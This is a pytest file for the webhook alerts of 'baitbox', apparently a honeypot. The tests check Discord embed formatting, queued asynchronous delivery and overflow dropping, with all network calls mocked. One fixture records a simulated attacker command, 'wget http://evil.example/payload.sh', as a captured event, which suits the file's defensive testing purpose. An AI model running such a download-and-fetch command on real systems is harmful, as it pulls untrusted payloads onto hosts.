"""Tests for webhook notification formatting and delivery."""

from __future__ import annotations

import json
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

from baitbox.webhooks import _send_webhook_sync, send_webhook_notification


def _webhook_settings(**kwargs):
    defaults = {"webhook_url": "", "webhook_type": "discord", "webhook_min_threat_level": "LOW"}
    defaults.update(kwargs)
    return SimpleNamespace(**defaults)


def test_send_webhook_skips_when_url_unset(monkeypatch):
    monkeypatch.setattr("baitbox.webhooks.settings", _webhook_settings())
    with patch("baitbox.webhooks.threading.Thread") as thread_cls:
        send_webhook_notification({"src_ip": "1.2.3.4"})
        thread_cls.assert_not_called()


def test_discord_webhook_includes_threat_fields(monkeypatch):
    captured: dict = {}

    class FakeResponse:
        def read(self):
            return b"ok"

    def fake_urlopen(req, timeout=5):
        captured["url"] = req.full_url
        captured["body"] = json.loads(req.data.decode())
        return FakeResponse()

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook", webhook_type="discord"),
    )
    monkeypatch.setattr("baitbox.webhooks.urllib.request.urlopen", fake_urlopen)

    event = {
        "src_ip": "203.0.113.10",
        "protocol": "SSH",
        "event_type": "command",
        "threat_level": "CRITICAL",
        "threat_score": 85,
        "threat_reasons": ["High-risk commands"],
        "payload": {"command": "wget http://evil.example/payload.sh"},
    }
    _send_webhook_sync(event)

    embed = captured["body"]["embeds"][0]
    assert embed["color"] == 15548997
    assert any(f["name"] == "Threat Level" for f in embed["fields"])
    assert "wget" in embed["description"]


def test_discord_webhook_telnet_auth_format(monkeypatch):
    captured: dict = {}

    class FakeResponse:
        def read(self):
            return b"ok"

    def fake_urlopen(req, timeout=5):
        captured["body"] = json.loads(req.data.decode())
        return FakeResponse()

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook", webhook_type="discord"),
    )
    monkeypatch.setattr("baitbox.webhooks.urllib.request.urlopen", fake_urlopen)

    _send_webhook_sync({
        "src_ip": "198.51.100.20",
        "protocol": "Telnet",
        "event_type": "auth_attempt",
        "payload": {"username": "admin", "password": "123456", "method": "telnet"},
    })

    assert "Telnet Login Attempt" in captured["body"]["embeds"][0]["description"]


def test_send_webhook_enqueues_async_delivery(monkeypatch):
    """v2.3.0: notifications go through the bounded queue and are delivered
    asynchronously by the singleton worker thread."""
    delivered: list[dict] = []

    class FakeResponse:
        def read(self):
            return b"ok"

    def fake_urlopen(req, timeout=5):
        delivered.append(json.loads(req.data.decode()))
        return FakeResponse()

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook"),
    )
    monkeypatch.setattr("baitbox.webhooks.urllib.request.urlopen", fake_urlopen)

    send_webhook_notification({"src_ip": "1.2.3.4", "protocol": "HTTP", "event_type": "request", "payload": {}})
    from baitbox.webhooks import flush_webhooks
    assert flush_webhooks(timeout=5)
    assert len(delivered) == 1


def test_webhook_queue_drops_on_overflow(monkeypatch):
    """When the bounded queue is full, events are dropped — not threads spawned."""
    import baitbox.webhooks as wh

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook"),
    )
    # Keep the consumer out of the picture so the queue fills deterministically
    monkeypatch.setattr(wh, "_ensure_worker", lambda: None)
    limit = wh._delivery_queue.maxsize
    for i in range(limit + 25):
        wh.send_webhook_notification({"src_ip": "1.2.3.4", "protocol": "HTTP", "event_type": "request", "payload": {}})
    # Queue never exceeds its bound and the rest were dropped
    assert wh._delivery_queue.qsize() == limit
    while not wh._delivery_queue.empty():
        wh._delivery_queue.get_nowait()
        wh._delivery_queue.task_done()
